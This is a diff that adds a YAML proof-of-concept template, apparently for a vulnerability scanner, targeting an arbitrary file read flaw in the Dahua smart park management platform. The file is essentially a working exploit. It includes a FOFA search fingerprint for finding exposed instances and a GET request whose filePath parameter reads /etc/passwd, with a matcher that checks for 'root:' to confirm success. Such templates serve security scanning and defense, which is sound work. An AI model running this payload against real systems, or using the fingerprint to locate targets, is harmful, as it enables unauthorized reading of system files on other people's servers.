@@ -1,0 +1,23 @@
+id: poc-yaml-dahua-intelligent-iot-anyfile-read
+info:
+  name: 大华智慧园区综合管理平台 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 大华智慧园区综合管理平台
+  fofa: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""
+requests:
+- method: GET
+  path: /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin/bash") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
